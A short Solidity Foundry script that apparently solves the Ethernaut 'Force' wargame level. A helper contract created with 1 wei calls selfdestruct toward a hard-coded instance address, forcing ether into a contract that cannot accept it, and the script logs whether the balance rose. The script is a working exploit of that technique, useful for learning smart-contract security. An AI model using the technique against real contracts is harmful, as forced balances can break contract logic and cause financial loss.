// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

contract ToBeDestructed {
    constructor(address payable _forceAddress) payable {
        selfdestruct(_forceAddress);
    }
}

contract ForceSolution is Script {

    address forceInstance = 0x5DE86f5CdB87f15cDa3D015F76Fa03ff76Ff5e77;

    function run() external {
        uint256 beforeBalance = forceInstance.balance;
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new ToBeDestructed{value:1 wei}(payable(0x5DE86f5CdB87f15cDa3D015F76Fa03ff76Ff5e77));
        vm.stopBroadcast();
        console.log(forceInstance.balance > beforeBalance);
    }
}